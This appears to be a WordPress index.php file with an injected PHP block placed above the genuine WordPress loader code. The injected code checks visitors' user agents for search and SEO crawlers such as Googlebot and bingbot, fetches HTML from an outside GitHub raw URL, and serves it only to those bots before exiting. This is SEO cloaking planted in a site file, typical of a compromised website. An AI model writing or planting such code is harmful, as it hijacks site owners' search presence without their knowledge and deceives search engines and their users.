<?php
 
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'tidak ada user agent';
    $bots = array(
        'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
        'Google-InspectionTool', 'AhrefsBot', 'SemrushBot', 'MJ12bot',
        'DotBot', 'PetalBot', 'facebot'
    );
 
    if (empty($user_agent)) {
        return true;
    }
 
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
 
    return false;
}
 
 
function get_remote_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'bot-checker');
    $response = curl_exec($ch);
 
    if (curl_errno($ch)) {
        echo 'Curl error: ' . curl_error($ch);
    }
 
    curl_close($ch);
    return $response;
}
 
 
$target_url = 'https://raw.githubusercontent.com/fadlipul69/zipwebsite/refs/heads/main/index.html';
 
 
if (is_bot()) {
    $message = get_remote_content($target_url);
    if ($message) {
        echo $message;
    } else {
        echo "Gagal ambil konten dari URL.";
    }
    exit;
}
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
